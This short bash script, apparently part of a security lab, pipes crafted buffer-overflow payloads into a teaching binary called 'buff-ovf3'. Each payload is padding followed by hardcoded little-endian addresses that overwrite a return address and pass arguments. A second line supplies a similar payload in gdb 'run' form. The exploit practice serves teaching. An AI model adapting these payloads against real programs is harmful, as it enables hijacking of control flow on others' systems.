#!/bin/bash
# SPDX-License-Identifier: BSD-3-Clause

python3 -c 'import sys; sys.stdout.buffer.write(b"A"*18 + b"\x96\x11\x40\x00"
                                                        + b"\x00\x93\x04\x08"
                                                        + b"\x38\x00\x00\x00"
                                                        + b"\x0d\x00\x00\x00")' | ../support/buff-ovf3


run < <(python3 -c 'import sys; sys.stdout.buffer.write(b"\x00"*18 + b"\x3c\x13\x40\x00\x00\x00\x00\x00" + b"\x00"*2000)')